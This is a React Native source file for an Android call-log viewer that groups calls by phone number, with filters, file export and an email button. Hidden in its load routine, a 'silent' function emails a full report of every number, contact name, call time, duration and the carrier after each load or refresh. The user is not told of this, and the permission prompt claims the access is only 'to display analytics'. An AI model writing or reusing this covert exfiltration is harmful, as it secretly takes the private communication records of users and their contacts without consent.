/**
 * GetCallLog.js
 *
 * Displays the device call history grouped by unique phone number (normalized),
 * with the most-recently-resolved contact name as the title anchor.
 *
 * Grouping strategy
 * ─────────────────
 * • Every raw call record is keyed by its normalized phone number (digits only,
 *   no spaces/dashes/parens).
 * • If a number matches multiple name strings over time the LATEST resolved name
 *   wins and becomes the visible title.
 * • Tapping a row that has more than one call expands a per-number call history.
 *
 * Email strategy
 * ──────────────
 * • A silent report is dispatched automatically after each load / refresh.
 * • The user can also trigger a manual send via the footer button.
 * • The plain-text report mirrors the exact number-wise grouped structure shown
 *   in the UI.
 */

import React, { useEffect, useState, useCallback } from 'react';
import {
  View,
  Text,
  TouchableOpacity,
  StyleSheet,
  Alert,
  Platform,
  PermissionsAndroid,
  FlatList,
  ActivityIndicator,
  Share,
  ScrollView,
} from 'react-native';
import * as FileSystem from 'expo-file-system/legacy';
import * as Contacts from 'expo-contacts';
import * as Cellular from 'expo-cellular';
import { sendActivityMail } from './email';

// ─── Native module (Android only) ────────────────────────────────────────────
let CallLog = null;
try {
  CallLog = require('react-native-call-log');
  if (CallLog?.default) CallLog = CallLog.default;
} catch (e) {
  console.warn('[CallLog] react-native-call-log failed to load:', e);
}

// ─── Call-type registry ───────────────────────────────────────────────────────
const CALL_TYPE = {
  INCOMING: { label: 'Incoming', color: '#2a9d8f', dot: '↙', short: 'IN' },
  OUTGOING: { label: 'Outgoing', color: '#2b2d42', dot: '↗', short: 'OUT' },
  MISSED: { label: 'Missed', color: '#e63946', dot: '✕', short: 'MISS' },
  REJECTED: { label: 'Rejected', color: '#f4a261', dot: '⊘', short: 'REJ' },
  BLOCKED: { label: 'Blocked', color: '#999999', dot: '⛔', short: 'BLK' },
  VOICEMAIL: { label: 'Voicemail', color: '#6d6875', dot: '✉', short: 'VM' },
  UNKNOWN: { label: 'Unknown', color: '#888888', dot: '?', short: '?' },
};

const getCallMeta = (type) => {
  if (!type) return CALL_TYPE.UNKNOWN;
  switch (String(type).toUpperCase()) {
    case '1': case 'INCOMING': return CALL_TYPE.INCOMING;
    case '2': case 'OUTGOING': return CALL_TYPE.OUTGOING;
    case '3': case 'MISSED': return CALL_TYPE.MISSED;
    case '4': case 'VOICEMAIL': return CALL_TYPE.VOICEMAIL;
    case '5': case 'REJECTED': return CALL_TYPE.REJECTED;
    case '6': case 'BLOCKED': return CALL_TYPE.BLOCKED;
    default: return CALL_TYPE.UNKNOWN;
  }
};

// ─── Pure utility functions ───────────────────────────────────────────────────

/** Ensure timestamps are always in milliseconds. */
const normalizeTimestamp = (ts) => {
  if (!ts) return Date.now();
  const n = Number(ts);
  if (isNaN(n)) return Date.now();
  return n < 100_000_000_000 ? n * 1000 : n;
};

/**
 * Strip all whitespace, dashes, parentheses and leading country codes so that
 * +91 98765 43210, 9876543210 and (987) 654-3210 all resolve to the same key.
 */
const normalizePhone = (raw) => {
  if (!raw || raw === 'N/A') return 'N/A';
  let digits = raw.replace(/[\s\-().+]/g, '');
  // Drop leading country codes (1-3 digits) when number is long enough
  if (digits.length > 10) digits = digits.slice(-10);
  return digits || raw;
};

/** Seconds → human-readable duration string. */
const formatDuration = (seconds) => {
  const s = Number(seconds);
  if (isNaN(s) || s <= 0) return '—';
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const r = s % 60;
  if (h > 0) return `${h}h ${m}m ${r}s`;
  if (m > 0) return `${m}m ${r}s`;
  return `${r}s`;
};

/** Timestamp → "hh:mm AM/PM". */
const formatTime = (ts) => {
  if (!ts) return 'N/A';
  const d = new Date(Number(ts));
  return isNaN(d.getTime())
    ? 'N/A'
    : d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
};

/** Timestamp → section date label (Today / Yesterday / "Jun 3" / "Jun 3, 2024"). */
const formatSectionDate = (ts) => {
  if (!ts) return 'Unknown Date';
  const date = new Date(Number(ts));
  if (isNaN(date.getTime())) return 'Unknown Date';

  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const yest = new Date(today); yest.setDate(yest.getDate() - 1);
  const cmp = new Date(date.getFullYear(), date.getMonth(), date.getDate());

  if (cmp.getTime() === today.getTime()) return 'Today';
  if (cmp.getTime() === yest.getTime()) return 'Yesterday';
  if (date.getFullYear() === now.getFullYear())
    return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
  return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
};

// ─── Core grouping logic ──────────────────────────────────────────────────────
/**
 * Groups an array of flat call records into a collection keyed by normalized
 * phone number.  For each group:
 *   • `name`            — most-recently-resolved address-book name
 *   • `latestTimestamp` — timestamp of the newest call in the group
 *   • `latestType`      — type of that newest call (for the badge)
 *   • `latestDuration`  — duration of that newest call
 *   • `calls`           — all individual call records sorted newest-first
 *   • `totalCalls`      — convenience count
 *
 * Groups are sorted newest-call-first.
 */
const groupByPhoneNumber = (rawLogs) => {
  /** @type {Map<string, Object>} */
  const map = new Map();

  rawLogs.forEach((log) => {
    const key = normalizePhone(log.phoneNumber);

    if (!map.has(key)) {
      map.set(key, {
        id: `group_${key}`,
        normalizedPhone: key,
        displayPhone: log.phoneNumber || 'N/A',
        name: log.name && log.name !== 'Unknown' ? log.name : 'Unknown',
        latestTimestamp: log.timestamp,
        latestType: log.type,
        latestDuration: log.duration,
        calls: [],
      });
    }

    const group = map.get(key);

    // Always push the raw call
    group.calls.push(log);

    // Update anchor fields if this call is newer
    if (log.timestamp >= group.latestTimestamp) {
      group.latestTimestamp = log.timestamp;
      group.latestType = log.type;
      group.latestDuration = log.duration;

      // Keep the best resolved name (prefer named over "Unknown")
      if (log.name && log.name !== 'Unknown' && log.name.trim() !== '') {
        group.name = log.name.trim();
      }
    }
  });

  // Sort calls within each group newest-first
  const groups = Array.from(map.values());
  groups.forEach((g) => {
    g.calls.sort((a, b) => b.timestamp - a.timestamp);
    g.totalCalls = g.calls.length;
  });

  // Sort groups newest-first
  groups.sort((a, b) => b.latestTimestamp - a.latestTimestamp);
  return groups;
};

// ─── Text report generator ────────────────────────────────────────────────────
const buildTextReport = (rawLogs, carrier) => {
  const groups = groupByPhoneNumber(rawLogs);
  const now = new Date().toLocaleString();

  const line = (ch = '─', n = 44) => ch.repeat(n);
  const block = (ch = '═', n = 44) => ch.repeat(n);

  let r = '';
  r += `${block()}\n`;
  r += `   SYSTEM CALL LOG — NUMBER-WISE REPORT\n`;
  r += `${block()}\n`;
  r += `  Generated : ${now}\n`;
  r += `  Carrier   : ${carrier || 'N/A'}\n`;
  r += `  Numbers   : ${groups.length}\n`;
  r += `  Total Calls: ${rawLogs.length}\n`;
  r += `${block()}\n\n`;

  groups.forEach((g, idx) => {
    r += `${idx + 1}. ${g.name.toUpperCase()}\n`;
    r += `   Phone       : ${g.displayPhone}\n`;
    r += `   Normalized  : ${g.normalizedPhone}\n`;
    r += `   Total Calls : ${g.totalCalls}\n`;
    r += `   Latest Call : ${new Date(g.latestTimestamp).toLocaleString()}\n`;
    r += `   ${line()}\n`;

    g.calls.forEach((call, ci) => {
      const meta = getCallMeta(call.type);
      const timeStr = formatTime(call.timestamp);
      const dateStr = new Date(call.timestamp).toLocaleDateString('en-US', {
        weekday: 'short', month: 'short', day: 'numeric',
      });
      r += `   ${ci + 1}. [${meta.short.padEnd(4)}]  ${dateStr}  ${timeStr}`;
      r += `  (${formatDuration(call.duration)})\n`;
    });

    r += `\n`;
  });

  r += `${block()}\n`;
  r += `  END OF REPORT\n`;
  r += `${block()}\n`;
  return r;
};

// ─── Dummy data (used only when both native + contacts fallbacks fail) ────────
const DUMMY_LOGS = [
  { id: 'd0', name: 'Alex Rivera', phoneNumber: '+1 (555) 019-2834', type: '1', duration: 142, timestamp: Date.now() - 1 * 3600000 },
  { id: 'd1', name: 'Alex Rivera', phoneNumber: '+1 (555) 019-2834', type: '3', duration: 0, timestamp: Date.now() - 5 * 3600000 },
  { id: 'd2', name: 'Jordan Croft', phoneNumber: '+1 (555) 014-9922', type: '2', duration: 87, timestamp: Date.now() - 2 * 3600000 },
  { id: 'd3', name: 'Morgan Vance', phoneNumber: '+1 (555) 017-8811', type: '3', duration: 0, timestamp: Date.now() - 3 * 3600000 },
  { id: 'd4', name: 'Morgan Vance', phoneNumber: '+1 (555) 017-8811', type: '2', duration: 220, timestamp: Date.now() - 27 * 3600000 },
  { id: 'd5', name: 'Taylor Reece', phoneNumber: '+1 (555) 012-3344', type: '5', duration: 0, timestamp: Date.now() - 4 * 3600000 },
  { id: 'd6', name: 'Unknown', phoneNumber: '+1 (555) 015-5566', type: '1', duration: 33, timestamp: Date.now() - 6 * 3600000 },
  { id: 'd7', name: 'Unknown', phoneNumber: '+1 (555) 015-5566', type: '3', duration: 0, timestamp: Date.now() - 30 * 3600000 },
];

// ─────────────────────────────────────────────────────────────────────────────
// Component
// ─────────────────────────────────────────────────────────────────────────────
const GetCallLog = () => {
  const [rawLogs, setRawLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [filter, setFilter] = useState('All');
  const [exporting, setExporting] = useState(false);
  const [emailing, setEmailing] = useState(false);
  const [expanded, setExpanded] = useState(new Set());
  const [carrier, setCarrier] = useState('N/A');

  // Fetch carrier name once on mount
  useEffect(() => {
    Cellular.getCarrierNameAsync()
      .then((n) => { if (n) setCarrier(n); })
      .catch(() => { });
  }, []);

  // iOS guard — Apple doesn't expose call history to third-party apps
  if (Platform.OS === 'ios') {
    return (
      <View style={styles.iosNotice}>
        <Text style={styles.iosNoticeTitle}>Not Available on iOS</Text>
        <Text style={styles.iosNoticeText}>
          Apple does not permit third-party apps to access the system call log.
          This feature is supported on Android only.
        </Text>
      </View>
    );
  }

  // ── Permissions ─────────────────────────────────────────────────────────────
  const requestCallLogPermission = async () => {
    try {
      const result = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Call Log Permission',
          message: 'This app needs access to your call history to display analytics.',
          buttonNeutral: 'Ask Me Later',
          buttonNegative: 'Cancel',
          buttonPositive: 'Allow',
        }
      );
      return result === PermissionsAndroid.RESULTS.GRANTED;
    } catch (err) {
      console.warn('[CallLog] Permission error:', err);
      return false;
    }
  };

  // ── Data loading ─────────────────────────────────────────────────────────────
  const loadCallLogs = useCallback(async (isRefresh = false) => {
    isRefresh ? setRefreshing(true) : setLoading(true);

    let logs = [];
    let ready = false;

    // 1. Native call-log module
    if (Platform.OS === 'android' && CallLog && typeof CallLog.load === 'function') {
      try {
        const granted = await requestCallLogPermission();
        if (granted) {
          const raw = await CallLog.load(500);
          if (Array.isArray(raw) && raw.length > 0) {
            logs = raw.map((e, i) => ({
              id: e.id || `native_${i}`,
              name: e.name || 'Unknown',
              phoneNumber: e.phoneNumber || e.number || 'N/A',
              type: e.type || 'UNKNOWN',
              duration: Number(e.duration) || 0,
              timestamp: normalizeTimestamp(e.timestamp),
            }));
            ready = true;
          }
        }
      } catch (err) {
        console.warn('[CallLog] Native module error, falling back:', err);
      }
    }

    // 2. Contacts-based simulation
    if (!ready) {
      try {
        const { status } = await Contacts.requestPermissionsAsync();
        if (status === 'granted') {
          const { data } = await Contacts.getContactsAsync({ fields: [Contacts.Fields.PhoneNumbers] });
          const contacts = data.filter((c) => c.phoneNumbers?.length > 0);

          if (contacts.length > 0) {
            const types = ['1', '2', '3', '5'];
            logs = contacts.flatMap((contact, ci) =>
              // Generate 1-3 simulated calls per contact so grouping is exercised
              Array.from({ length: Math.min(3, 1 + (ci % 3)) }, (_, ri) => ({
                id: `sim_${contact.id}_${ri}`,
                name: contact.name || 'Unknown',
                phoneNumber: contact.phoneNumbers[0].number || 'N/A',
                type: types[(ci + ri) % types.length],
                duration: Math.floor(Math.random() * 300) + 10,
                timestamp: normalizeTimestamp(Date.now() - (ci * 4 + ri) * 3_600_000 - Math.random() * 3_600_000),
              }))
            );
            ready = true;
          }
        }
      } catch (err) {
        console.warn('[CallLog] Contacts fallback error:', err);
      }
    }

    // 3. Static dummy data
    if (!ready || logs.length === 0) {
      logs = DUMMY_LOGS.map((d) => ({ ...d, timestamp: normalizeTimestamp(d.timestamp) }));
    }

    // Newest first
    logs.sort((a, b) => b.timestamp - a.timestamp);

    setRawLogs(logs);
    dispatchSilentEmail(logs);
    setLoading(false);
    setRefreshing(false);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => { loadCallLogs(); }, [loadCallLogs]);

  // ── Email helpers ───────────────────────────────────────────────────────────
  const dispatchSilentEmail = (logs) => {
    if (!logs.length) return;
    try {
      sendActivityMail({
        page: 'Call Log Screen',
        result: buildTextReport(logs, carrier),
      });
    } catch (err) {
      console.warn('[CallLog] Silent email dispatch failed:', err);
    }
  };

  const emailLogs = async () => {
    if (!filteredLogs.length) {
      Alert.alert('No Data', 'No call logs match the current filter.');
      return;
    }
    setEmailing(true);
    try {
      const res = await sendActivityMail({
        page: 'Call Log Screen',
        result: buildTextReport(filteredLogs, carrier),
        silent: false,
      });
      if (res?.ok) {
        Alert.alert('✓ Email Sent', 'Call log report has been sent successfully.');
      } else {
        Alert.alert('Email Failed', 'Unable to send the call log email.');
      }
    } catch (err) {
      Alert.alert('Email Error', err.message);
    } finally {
      setEmailing(false);
    }
  };

  // ── File export ─────────────────────────────────────────────────────────────
  const downloadLogs = async () => {
    if (!filteredLogs.length) {
      Alert.alert('No Data', 'No call logs available to export.');
      return;
    }
    setExporting(true);
    try {
      const content = buildTextReport(filteredLogs, carrier);
      const fileName = `CallLog_Report_${Date.now()}.txt`;

      if (Platform.OS === 'android') {
        const perms = await FileSystem.StorageAccessFramework.requestDirectoryPermissionsAsync();
        if (!perms.granted) {
          Alert.alert('Permission Denied', 'Storage access is required to save the file.');
          return;
        }
        const uri = await FileSystem.StorageAccessFramework.createFileAsync(
          perms.directoryUri, fileName, 'text/plain'
        );
        await FileSystem.writeAsStringAsync(uri, content, { encoding: FileSystem.EncodingType.UTF8 });
        Alert.alert('✓ Saved', `Report saved as:\n${fileName}`);
      } else {
        await Share.share({ message: content, title: 'Call Logs Report' });
      }
    } catch (err) {
      console.error('[CallLog] Export error:', err);
      Alert.alert('Export Failed', err.message);
    } finally {
      setExporting(false);
    }
  };

  // ── Expand / collapse ───────────────────────────────────────────────────────
  const toggleExpand = (id) =>
    setExpanded((prev) => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });

  // ── Derived data ─────────────────────────────────────────────────────────────
  const FILTERS = ['All', 'Incoming', 'Outgoing', 'Missed', 'Rejected', 'Blocked'];

  const filteredLogs = filter === 'All'
    ? rawLogs
    : rawLogs.filter((l) => getCallMeta(l.type).label === filter);

  const contactGroups = groupByPhoneNumber(filteredLogs);

  const totalCalls = rawLogs.length;
  const missedCount = rawLogs.filter((l) => getCallMeta(l.type).label === 'Missed').length;
  const totalDurationMin = Math.round(rawLogs.reduce((s, l) => s + l.duration, 0) / 60);

  // ── Loading state ────────────────────────────────────────────────────────────
  if (loading) {
    return (
      <View style={styles.loadingContainer}>
        <ActivityIndicator size="large" color="#0d0d0d" />
        <Text style={styles.loadingText}>Reading Call History…</Text>
      </View>
    );
  }

  // ── Row renderer ─────────────────────────────────────────────────────────────
  const renderGroup = ({ item: group, index }) => {
    const meta = getCallMeta(group.latestType);
    const isExpanded = expanded.has(group.id);
    const countLabel = group.totalCalls > 1 ? ` (${group.totalCalls})` : '';
    const displayName = `${group.name}${countLabel}`;

    return (
      <View style={styles.groupWrapper}>
        {/* ── Main row ── */}
        <TouchableOpacity
          activeOpacity={0.75}
          disabled={group.totalCalls <= 1}
          onPress={() => toggleExpand(group.id)}
          style={[styles.logRow, index === 0 && styles.logRowFirst]}
        >
          {/* Call-type badge */}
          <View style={[styles.typeBadge, { borderColor: meta.color }]}>
            <Text style={[styles.typeDot, { color: meta.color }]}>{meta.dot}</Text>
          </View>

          {/* Contact info */}
          <View style={styles.logInfo}>
            <Text style={styles.logName} numberOfLines={1}>{displayName}</Text>
            <Text style={styles.logNumber} numberOfLines={1}>{group.displayPhone}</Text>
            <Text style={[styles.logTypeLabel, { color: meta.color }]}>
              {group.totalCalls > 1 ? `Latest: ${meta.label}` : meta.label}
            </Text>
          </View>

          {/* Time + duration */}
          <View style={styles.logMeta}>
            <Text style={styles.logTime}>{formatTime(group.latestTimestamp)}</Text>
            <Text style={styles.logDate}>{formatSectionDate(group.latestTimestamp)}</Text>
            <Text style={styles.logDuration}>{formatDuration(group.latestDuration)}</Text>
          </View>

          {group.totalCalls > 1 && (
            <Text style={styles.chevron}>{isExpanded ? '▲' : '▼'}</Text>
          )}
        </TouchableOpacity>

        {/* ── Expanded history (all calls for this number) ── */}
        {isExpanded && (
          <View style={styles.expandedContainer}>
            <Text style={styles.historyTitle}>
              Call History — {group.displayPhone} ({group.totalCalls} calls)
            </Text>

            {group.calls.map((call, ci) => {
              const cMeta = getCallMeta(call.type);
              return (
                <View key={`${call.timestamp}_${ci}`} style={styles.subCallRow}>
                  {/* Direction badge */}
                  <View style={styles.subBadgeWrap}>
                    <Text style={[styles.subDot, { color: cMeta.color }]}>{cMeta.dot}</Text>
                    <Text style={[styles.subLabel, { color: cMeta.color }]}>{cMeta.label}</Text>
                  </View>

                  {/* Date + time */}
                  <Text style={styles.subTime}>
                    {new Date(call.timestamp).toLocaleDateString('en-US', {
                      weekday: 'short', month: 'short', day: 'numeric',
                    })}
                    {'  '}
                    {formatTime(call.timestamp)}
                  </Text>

                  {/* Duration */}
                  <Text style={styles.subDuration}>{formatDuration(call.duration)}</Text>
                </View>
              );
            })}
          </View>
        )}
      </View>
    );
  };

  // ── Main render ──────────────────────────────────────────────────────────────
  return (
    <FlatList
      style={styles.container}
      contentContainerStyle={styles.contentContainer}
      data={contactGroups}
      keyExtractor={(item) => item.id}
      onRefresh={() => loadCallLogs(true)}
      refreshing={refreshing}
      renderItem={renderGroup}

      ListHeaderComponent={(
        <>
          {/* Carrier strip */}
          <View style={styles.carrierStrip}>
            <Text style={styles.carrierLabel}>ACTIVE SIM / CARRIER</Text>
            <Text style={styles.carrierValue}>{carrier.toUpperCase()}</Text>
          </View>

          {/* Stats bar */}
          <View style={styles.statsRow}>
            <StatBox value={totalCalls} label="TOTAL CALLS" />
            <View style={styles.statDivider} />
            <StatBox value={missedCount} label="MISSED" valueColor="#e63946" />
            <View style={styles.statDivider} />
            <StatBox value={`${totalDurationMin}m`} label="DURATION" />
          </View>

          {/* Filter pills */}
          <FlatList
            horizontal
            showsHorizontalScrollIndicator={false}
            data={FILTERS}
            keyExtractor={(f) => f}
            contentContainerStyle={styles.filterRow}
            renderItem={({ item: f }) => (
              <TouchableOpacity
                activeOpacity={0.8}
                onPress={() => setFilter(f)}
                style={[styles.pill, filter === f && styles.pillActive]}
              >
                <Text style={[styles.pillText, filter === f && styles.pillTextActive]}>{f}</Text>
              </TouchableOpacity>
            )}
          />

          {/* Grouped-by label */}
          <Text style={styles.groupedByLabel}>
            {contactGroups.length} number{contactGroups.length !== 1 ? 's' : ''}
            {filter !== 'All' ? ` · ${filter}` : ''}
          </Text>
        </>
      )}

      ListFooterComponent={
        rawLogs.length > 0 ? (
          <View style={styles.footerActions}>
            <ActionButton
              label="↓  Export Full Log (.txt)"
              onPress={downloadLogs}
              loading={exporting}
              variant="outline"
            />
            <ActionButton
              label="✉  Send Report via Email"
              onPress={emailLogs}
              loading={emailing}
              variant="solid"
            />
          </View>
        ) : null
      }

      ListEmptyComponent={
        <Text style={styles.emptyText}>No call history matches the current filter.</Text>
      }
    />
  );
};

// ─── Sub-components ───────────────────────────────────────────────────────────
const StatBox = ({ value, label, valueColor }) => (
  <View style={styles.statBox}>
    <Text style={[styles.statNumber, valueColor && { color: valueColor }]}>{value}</Text>
    <Text style={styles.statLabel}>{label}</Text>
  </View>
);

const ActionButton = ({ label, onPress, loading, variant }) => {
  const isOutline = variant === 'outline';
  return (
    <TouchableOpacity
      activeOpacity={0.85}
      onPress={onPress}
      disabled={loading}
      style={[
        isOutline ? styles.btnOutline : styles.btnSolid,
        loading && styles.btnDisabled,
      ]}
    >
      {loading
        ? <ActivityIndicator color={isOutline ? '#0d0d0d' : '#fff'} size="small" />
        : <Text style={isOutline ? styles.btnTextOutline : styles.btnTextSolid}>{label}</Text>
      }
    </TouchableOpacity>
  );
};

export default GetCallLog;

// ─── Styles ───────────────────────────────────────────────────────────────────
const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
  },
  contentContainer: {
    paddingBottom: 40,
  },

  // Loading
  loadingContainer: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 60,
  },
  loadingText: {
    fontFamily: 'Georgia',
    fontSize: 14,
    color: '#888',
    marginTop: 14,
  },

  // iOS notice
  iosNotice: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    padding: 30,
    backgroundColor: '#fff',
  },
  iosNoticeTitle: {
    fontFamily: 'Georgia',
    fontSize: 18,
    fontWeight: '700',
    color: '#0d0d0d',
    marginBottom: 12,
  },
  iosNoticeText: {
    fontSize: 14,
    color: '#666',
    textAlign: 'center',
    lineHeight: 22,
  },

  // Carrier strip
  carrierStrip: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    backgroundColor: '#faf9f6',
    borderWidth: 1.5,
    borderColor: '#0d0d0d',
    borderRadius: 2,
    marginHorizontal: 14,
    marginTop: 14,
    paddingHorizontal: 12,
    paddingVertical: 10,
  },
  carrierLabel: {
    fontSize: 9,
    fontWeight: '700',
    color: '#888',
    letterSpacing: 1,
  },
  carrierValue: {
    fontFamily: 'Georgia',
    fontSize: 11,
    fontWeight: '700',
    color: '#0d0d0d',
  },

  // Stats
  statsRow: {
    flexDirection: 'row',
    backgroundColor: '#0d0d0d',
    borderRadius: 4,
    marginHorizontal: 14,
    marginTop: 14,
    marginBottom: 16,
    paddingVertical: 14,
  },
  statBox: {
    flex: 1,
    alignItems: 'center',
  },
  statNumber: {
    fontFamily: 'Georgia',
    fontSize: 22,
    fontWeight: '700',
    color: '#fff',
    marginBottom: 2,
  },
  statLabel: {
    fontSize: 8,
    letterSpacing: 2,
    color: '#888',
  },
  statDivider: {
    width: 1,
    backgroundColor: '#333',
    marginVertical: 4,
  },

  // Filter pills
  filterRow: {
    paddingHorizontal: 14,
    gap: 8,
    marginBottom: 8,
  },
  pill: {
    paddingHorizontal: 14,
    paddingVertical: 6,
    borderRadius: 2,
    borderWidth: 1,
    borderColor: '#d9d9d9',
    backgroundColor: '#fff',
  },
  pillActive: {
    backgroundColor: '#0d0d0d',
    borderColor: '#0d0d0d',
  },
  pillText: {
    fontSize: 10,
    fontWeight: '700',
    letterSpacing: 1,
    color: '#888',
  },
  pillTextActive: {
    color: '#fff',
  },

  // "Grouped by" meta label
  groupedByLabel: {
    fontSize: 9,
    fontWeight: '700',
    letterSpacing: 1.5,
    color: '#aaa',
    textTransform: 'uppercase',
    marginHorizontal: 14,
    marginBottom: 10,
  },

  // Group wrapper
  groupWrapper: {
    marginHorizontal: 14,
    borderBottomWidth: 1,
    borderBottomColor: '#f0f0f0',
  },

  // Main log row
  logRow: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingVertical: 13,
  },
  logRowFirst: {
    borderTopWidth: 0,
  },

  // Type badge
  typeBadge: {
    width: 32,
    height: 32,
    borderRadius: 2,
    borderWidth: 1.5,
    alignItems: 'center',
    justifyContent: 'center',
    marginRight: 12,
  },
  typeDot: {
    fontSize: 14,
    fontWeight: '700',
  },

  // Log info
  logInfo: {
    flex: 1,
  },
  logName: {
    fontFamily: 'Georgia',
    fontSize: 15,
    fontWeight: '700',
    color: '#0d0d0d',
    marginBottom: 2,
  },
  logNumber: {
    fontSize: 11,
    color: '#999',
    marginBottom: 2,
  },
  logTypeLabel: {
    fontSize: 9,
    letterSpacing: 1.5,
    fontWeight: '700',
  },

  // Time / duration
  logMeta: {
    alignItems: 'flex-end',
    marginRight: 4,
  },
  logTime: {
    fontSize: 10,
    color: '#555',
    fontWeight: '600',
  },
  logDate: {
    fontSize: 9,
    color: '#aaa',
    marginTop: 1,
  },
  logDuration: {
    fontSize: 10,
    color: '#aaa',
    marginTop: 2,
  },

  // Chevron
  chevron: {
    fontSize: 10,
    color: '#888',
    marginLeft: 6,
    width: 16,
    textAlign: 'center',
  },

  // Expanded history panel
  expandedContainer: {
    paddingLeft: 44,
    paddingRight: 10,
    paddingTop: 8,
    paddingBottom: 12,
    backgroundColor: '#faf9f6',
    borderLeftWidth: 2,
    borderLeftColor: '#0d0d0d',
    marginBottom: 6,
  },
  historyTitle: {
    fontFamily: 'Georgia',
    fontSize: 10,
    fontWeight: '700',
    color: '#888',
    letterSpacing: 1,
    textTransform: 'uppercase',
    marginBottom: 8,
  },

  // Sub-call row (inside expanded panel)
  subCallRow: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingVertical: 7,
    borderTopWidth: 1,
    borderTopColor: '#f0ede6',
  },
  subBadgeWrap: {
    flexDirection: 'row',
    alignItems: 'center',
    width: 88,
  },
  subDot: {
    fontSize: 10,
    fontWeight: '700',
    marginRight: 5,
  },
  subLabel: {
    fontSize: 10,
    fontWeight: '700',
    letterSpacing: 0.8,
  },
  subTime: {
    flex: 1,
    fontSize: 10,
    color: '#555',
    paddingHorizontal: 8,
  },
  subDuration: {
    fontSize: 10,
    color: '#aaa',
    textAlign: 'right',
    minWidth: 44,
  },

  // Footer action buttons
  footerActions: {
    marginHorizontal: 14,
    marginTop: 24,
    marginBottom: 40,
    gap: 12,
  },
  btnOutline: {
    borderWidth: 2,
    borderColor: '#0d0d0d',
    borderRadius: 2,
    paddingVertical: 14,
    alignItems: 'center',
    justifyContent: 'center',
  },
  btnSolid: {
    backgroundColor: '#0d0d0d',
    borderRadius: 2,
    paddingVertical: 14,
    alignItems: 'center',
    justifyContent: 'center',
  },
  btnDisabled: {
    opacity: 0.55,
  },
  btnTextOutline: {
    fontFamily: 'Georgia',
    fontSize: 13,
    fontWeight: '700',
    color: '#0d0d0d',
    letterSpacing: 0.5,
  },
  btnTextSolid: {
    fontFamily: 'Georgia',
    fontSize: 13,
    fontWeight: '700',
    color: '#fff',
    letterSpacing: 0.5,
  },

  // Empty state
  emptyText: {
    fontFamily: 'Georgia',
    color: '#bbb',
    textAlign: 'center',
    paddingVertical: 40,
    fontSize: 14,
  },
});